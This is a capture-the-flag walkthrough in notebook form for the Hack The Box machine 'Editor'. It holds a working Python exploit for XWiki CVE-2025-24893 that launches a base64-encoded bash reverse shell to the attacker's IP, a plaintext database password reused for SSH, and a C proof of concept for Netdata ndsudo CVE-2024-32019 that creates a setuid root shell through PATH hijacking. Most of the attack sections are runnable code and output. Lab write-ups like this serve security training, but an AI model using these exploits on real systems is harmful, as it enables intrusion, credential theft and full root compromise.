# Editor

<https://www.hackthebox.com/machines/Editor>

## Port Scanning

Add the mapping from `10.129.231.23` to `editor.htb` in `/etc/hosts`

```bash
# TCP scanning
sudo nmap -vv -sC -sV -T4 -A 10.129.231.23
```

In [1]:
TARGET_IP = "10.129.231.23"
TARGET_HOST = "editor.htb"
OUTPUT_DIR = TARGET_HOST
CREDENTIALS: dict[str, str] = {}

In [2]:
from common import scan_ports

print("Scanning TCP ports for IP:", TARGET_HOST)
scan_ports(TARGET_HOST, top_ports=1000)

Scanning TCP ports for IP: editor.htb
Nmap is installed.
Ports:
{'protocol': 'tcp', 'portid': '22'}
{'name': 'ssh', 'product': 'OpenSSH', 'version': '8.9p1 Ubuntu 3ubuntu0.13', 'extrainfo': 'Ubuntu Linux; protocol 2.0', 'ostype': 'Linux', 'method': 'probed', 'conf': '10'}
{'id': 'ssh-hostkey', 'output': '\n  256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=\n  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM'}
{'protocol': 'tcp', 'portid': '80'}
{'name': 'http', 'product': 'nginx', 'version': '1.18.0', 'extrainfo': 'Ubuntu', 'ostype': 'Linux', 'method': 'probed', 'conf': '10'}
{'id': 'http-server-header', 'output': 'nginx/1.18.0 (Ubuntu)'}
{'id': 'http-methods', 'output': '\n  Supported Methods: GET HEAD'}
{'id': 'http-titl

From nmap scanning results, we can know

| Port | Service       | Notes |
| ---- | ------------- | ----- |
| 22   | SSH (OpenSSH 8.9p1) | Ubuntu Linux |
| 80   | HTTP (nginx 1.18.0) | "Editor - SimplistCode Pro" |
| 8080 | HTTP (Jetty 10.0.20)  | XWiki instance; WebDAV enabled (PROPFIND, LOCK, UNLOCK); JSESSIONID cookie without httponly flag; 50 disallowed entries in robots.txt under `/xwiki/bin/` |


## Shell as `xwiki`

Exploit `CVE-2025-24893`

- <https://www.exploit-db.com/exploits/52136>
- <https://www.offsec.com/blog/cve-2025-24893/>

In [3]:
import base64
import re

import aiohttp

from common import get_openvpn_utun_ip

XWIKI_HOST = f"wiki.{TARGET_HOST}"
XWIKI_BASE_URL = f"http://{XWIKI_HOST}"

OUTPUT_PATTERN = re.compile(r"RSS feed for search on \[(?P<output>.*?)\]&lt;/title&gt")


async def run_command(
    session: aiohttp.ClientSession, command_str: str, timeout: int = 2
) -> str:
    params: dict[str, str] = {
        "media": "rss",
        "text": "{{async async=false}}{{groovy}}println([%s].execute().text){{/groovy}}{{/async}}"
        % command_str,
    }
    async with session.get(
        "/xwiki/bin/get/Main/SolrSearch",
        params=params,
        raise_for_status=True,
        timeout=aiohttp.ClientTimeout(total=timeout),
    ) as response:
        text = await response.text()
        match = OUTPUT_PATTERN.search(text)
        if match:
            output: str = match.group("output")
            output = output.replace("<br/>", "\n")
            return output.strip()
        raise ValueError("Command output not found in response")


async def run_command_args(
    session: aiohttp.ClientSession, args: list[str], timeout: int = 2
) -> str:
    command = ", ".join(f'"{arg}"' for arg in args)
    return await run_command(session, command, timeout=timeout)


async def exploit_xwiki():
    async with aiohttp.ClientSession(base_url=XWIKI_BASE_URL) as session:
        print("[*] Running command:", "id")
        result = await run_command_args(session, ["id"])
        print("[+] Command output:", result)

        print("[*] Running command:", "whoami")
        result = await run_command_args(session, ["whoami"])
        print("[+] Command output:", result)

        # Get a reverse shell
        lhost = get_openvpn_utun_ip()
        lport = 443
        command = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        encoded_command = base64.b64encode(command.encode()).decode()

        try:
            print("[*] Running command:", command)
            result = await run_command_args(
                session, ["bash", "-c", f"echo {encoded_command} | base64 -d | bash"]
            )
            print("[+] Command output:", result)
        except aiohttp.ClientResponseError as e:
            assert e.status == 504, f"Unexpected error status: {e.status}"
            print("[*] Expected gateway timeout error due to reverse shell:", e)
        except TimeoutError:
            print("[*] Expected timeout error due to reverse shell")


await exploit_xwiki()

[*] Running command: id
[+] Command output: uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
[*] Running command: whoami
[+] Command output: xwiki
[+] Found OpenVPN process with PID: 46106
[+] Found OpenVPN utun interface: utun7 with IP: 10.10.15.30
[*] Running command: bash -i >& /dev/tcp/10.10.15.30/443 0>&1
[*] Expected timeout error due to reverse shell


## Shell as `oliver`

Within the reverse shell, we act as `xwiki`. After searching under `/etc/xwiki` directory, we find something interesting

```shell
$ grep -C 5 -rni password .
./hibernate.cfg.xml-99-         If you want the main wiki database to be different than "xwiki" (or the default schema for schema based
./hibernate.cfg.xml-100-         engines) you will also have to set the property xwiki.db in xwiki.cfg file
./hibernate.cfg.xml-101-    -->
./hibernate.cfg.xml-102-    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
./hibernate.cfg.xml-103-    <property name="hibernate.connection.username">xwiki</property>
./hibernate.cfg.xml:104:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
./hibernate.cfg.xml-105-    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
./hibernate.cfg.xml-106-    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
./hibernate.cfg.xml-107-    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>
./hibernate.cfg.xml-108-
./hibernate.cfg.xml-109-    <property name="hibernate.connection.charSet">UTF-8</property>
...
```

In [4]:
CREDENTIALS["oliver"] = "theEd1t0rTeam99"

In [5]:
import asyncssh

from common import get_stdout, hide_flag

USERNAME = "oliver"
if USERNAME not in CREDENTIALS:
    raise ValueError(f"Credentials for user '{USERNAME}' not found")
PASSWORD = CREDENTIALS[USERNAME]

async with asyncssh.connect(TARGET_HOST, username=USERNAME, password=PASSWORD) as conn:
    result = await conn.run("id", check=True)
    print("[+] Current user:", get_stdout(result), end="")

    result = await conn.run("cat user.txt", check=True)
    print("[+] User flag:", hide_flag(get_stdout(result)), end="")

    # find / -perm -4000 -type f 2>/dev/null
    result = await conn.run("find / -perm -4000 -type f 2>/dev/null")
    print(get_stdout(result), end="")

    # find / -group netdata -type f 2>/dev/null
    result = await conn.run("find / -group netdata -type f 2>/dev/null")
    print(get_stdout(result), end="")

    # found interesting netdata stuff
    result = await conn.run("ls -alh /opt/netdata/", check=True)
    print(get_stdout(result), end="")

    result = await conn.run("/opt/netdata/bin/netdata -W buildinfo", check=True)
    print(get_stdout(result), end="")

[+] Current user: uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
[+] User flag: 92da...1da7
/tmp/bash
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/run/ebpf.pid
/run/netdata/netdata.pid
/opt/netdata/var/cache/netdata/netdata-meta.db
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000007.njf
/opt/netdata/var/cache/netdata/dbengine/journalfile-1-0000000010.n

## Shell as `root`

Exploit `CVE-2024-32019`

- <https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93>

PoC

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

int main() {
    setuid(0);
    seteuid(0);
    setgid(0);
    setegid(0);
    system("cp /bin/bash /tmp/bash; chown root:root /tmp/bash; chmod 6777 /tmp/bash");
    printf("Exploit executed. A setuid root shell has been created at /tmp/bash\n");
    return 0;
}
```

We can cross-compile the exploit on macOS

```bash
docker run --rm dockcross/linux-x64 > ./dockcross
chmod +x dockcross
./dockcross gcc -o nvme exploit.c
```

In [6]:
from pathlib import Path

import asyncssh

from common import get_stdout, hide_flag

USERNAME = "oliver"
if USERNAME not in CREDENTIALS:
    raise ValueError(f"Credentials for user '{USERNAME}' not found")
PASSWORD = CREDENTIALS[USERNAME]

EXPLOIT_BIN_PATH = Path("editor.htb/nvme")
if not EXPLOIT_BIN_PATH.exists():
    raise FileNotFoundError(f"Exploit binary not found at path: {EXPLOIT_BIN_PATH}")

await asyncssh.scp(
    EXPLOIT_BIN_PATH,
    (TARGET_HOST, "/home/oliver/nvme"),
    username=USERNAME,
    password=PASSWORD,
    known_hosts=None,
)

async with asyncssh.connect(TARGET_HOST, username=USERNAME, password=PASSWORD) as conn:
    result = await conn.run("file /home/oliver/nvme", check=True)
    print(get_stdout(result), end="")

    result = await conn.run(
        "PATH=/home/oliver /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list",
    )
    print("[*]", get_stdout(result), end="")

    async with conn.create_process("/tmp/bash -p") as process:
        print("[*] Spawned interactive shell, running id ...")
        process.stdin.write("id\n")
        await process.stdin.drain()  # Ensure the command is sent to the process
        output = await process.stdout.readline()
        print("[+] Current user:", output.strip())

        process.stdin.write("cat /root/root.txt\n")
        await process.stdin.drain()
        output = await process.stdout.readline()
        print("[+] Root flag:", hide_flag(output.strip()))

/home/oliver/nvme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4eb02ae3d5e3ea578d0d27e9b5213d09ee5dfc1e, for GNU/Linux 3.2.0, not stripped
[*] Exploit executed. A setuid root shell has been created at /tmp/bash
[*] Spawned interactive shell, running id ...
[+] Current user: uid=1000(oliver) gid=1000(oliver) euid=0(root) egid=0(root) groups=0(root),999(netdata),1000(oliver)
[+] Root flag: bc46...ebb0b
